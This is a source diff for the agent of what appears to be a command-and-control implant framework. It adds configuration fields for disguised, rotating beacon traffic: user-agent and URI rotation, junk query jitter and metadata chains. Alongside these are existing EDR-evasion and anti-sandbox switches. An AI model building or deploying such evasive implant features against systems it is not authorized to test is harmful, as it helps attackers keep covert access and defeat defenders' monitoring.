@@ -68,6 +68,14 @@ var (
 	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
 	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
 	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
+	MalleableClientID       string            = ""                            // v2 client id chain (wire form, audit/preview)
+	MalleableClientMeta     string            = ""                            // v2 client metadata chain (wire form)
+	BeaconURIsStr           string            = ""                            // v2 comma-joined rotation list (primary is BeaconURI)
+	BeaconParameterStr      string            = ""                            // v2 POST parameter name
+	MalleablePlacementStr   string            = ""                            // v2 placements JSON [{target,chain}] cover copies
+	UserAgentsStr           string            = ""                            // v2 UA rotation pool, newline-joined
+	JitterURIStr            string            = ""                            // v2 URI jitter flag ("true" = junk query per beacon)
+	ParameterNamesStr       string            = ""                            // v2 query param name pool, newline-joined
 	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
 	GhostModeStr            string            = "false"                       // Compile-time ghost protocol (sandbox/anti-debug deep-hiding); also FORGEC2_GHOST_MODE=1 at runtime
@@ -266,6 +274,14 @@ type agentConfigBlob struct {
 	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
 	MalleableRequestAppend  string            `json:"malleable_request_append"`
 	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
+	MalleableClientID       string            `json:"malleable_client_id"`
+	MalleableClientMeta     string            `json:"malleable_client_meta"`
+	BeaconURIs              string            `json:"beacon_uris"`
+	Parameter               string            `json:"parameter"`
+	MalleablePlacement      string            `json:"malleable_placement"`
+	UserAgents              string            `json:"user_agents"`
+	JitterURI               string            `json:"jitter_uri"`
+	ParameterNames          string            `json:"parameter_names"`
 }
 
 // loadConfigBlob decodes the injected runtime config block and reapplies it over
@@ -386,6 +402,9 @@ func applyServerNetworkConfig(b64 string) {
 	}
 	if nc.RequestHeaders != nil {
 		b.MalleableRequestHeaders = nc.RequestHeaders
+	}
+	if nc.MalleablePlacement != "" {
+		b.MalleablePlacement = nc.MalleablePlacement
 	}
 	// Only override sleep values when the server supplied authoritative ones;
 	// an agent's compile-time interval is left intact otherwise.
@@ -569,6 +588,30 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.MalleableRequestHeaders != nil {
 		MalleableRequestHeaders = b.MalleableRequestHeaders
+	}
+	if b.MalleableClientID != "" {
+		MalleableClientID = b.MalleableClientID
+	}
+	if b.MalleableClientMeta != "" {
+		MalleableClientMeta = b.MalleableClientMeta
+	}
+	if b.BeaconURIs != "" {
+		BeaconURIsStr = b.BeaconURIs
+	}
+	if b.Parameter != "" {
+		BeaconParameterStr = b.Parameter
+	}
+	if b.MalleablePlacement != "" {
+		MalleablePlacementStr = b.MalleablePlacement
+	}
+	if b.UserAgents != "" {
+		UserAgentsStr = b.UserAgents
+	}
+	if b.JitterURI != "" {
+		JitterURIStr = b.JitterURI
+	}
+	if b.ParameterNames != "" {
+		ParameterNamesStr = b.ParameterNames
 	}
 	if b.ContentLengthJitter != "" {
 		if v, err := strconv.Atoi(b.ContentLengthJitter); err == nil {
